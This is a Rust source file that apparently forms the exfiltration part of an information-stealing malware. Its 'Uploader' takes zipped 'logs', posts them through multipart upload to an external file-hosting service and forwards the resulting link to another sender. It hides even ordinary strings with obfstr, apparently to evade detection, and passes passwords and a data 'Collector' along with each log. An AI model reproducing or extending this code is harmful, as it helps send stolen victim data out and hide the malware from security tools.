use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
use alloc::sync::Arc;
use collector::Collector;
use derive_new::new;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, Response};

/// A wrapper around a [`LogSender`] that intercepts logs containing
/// internal zip archives and uploads them using a provided upload function.
///
/// If the log file's content is an internal zip archive ([`LogContent::ZipArchive`]),
/// [`Uploader`] will upload it via the `upload` function (a `fn(&str, &[u8]) -> Option<String>`),
/// which returns an external link as a `String`. Then, it replaces the log content with
/// an external link ([`LogContent::ExternalLink`]) before forwarding the modified log
/// to the inner [`LogSender`].
///
/// # Note
///
/// For log files that already contain an external link ([`LogContent::ExternalLink`]),
/// it simply delegates sending to the inner `LogSender` without modification.
#[derive(new, Clone)]
pub struct Uploader<T>
where
    T: LogSender,
{
    service_name: Arc<str>,
    inner: T,
    upload: fn(&str, &[u8]) -> Option<Arc<str>>,
}

impl<T> LogSender for Uploader<T>
where
    T: LogSender,
{
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector,
    {
        match &log_file.content {
            LogContent::ExternalLink(_) => self.inner.send(log_file, password, collector),
            LogContent::ZipArchive(archive) => {
                let size = archive.len();
                let external_link =
                    (self.upload)(&log_file.name, archive).ok_or(SendError::Network)?;
                let link = ExternalLink::new(self.service_name.clone(), external_link, size);

                self.inner.send(
                    log_file.change_content(LogContent::ExternalLink(link)),
                    password,
                    collector,
                )
            }
        }
    }
}

pub(crate) fn base_upload<'a>(name: &str, url: &str, bytes: &[u8]) -> Option<Response> {
    let mut builder = MultipartBuilder::new("----Multipart");
    builder.write_file_field(s!("file"), name, s!("application/zip"), bytes);

    let content_type = builder.content_type();
    let body = builder.finish();

    let response = Request::post(url)
        .header(s!("Content-Type"), &content_type)
        .body(body)
        .build()
        .send()
        .ok()?;

    Some(response)
}
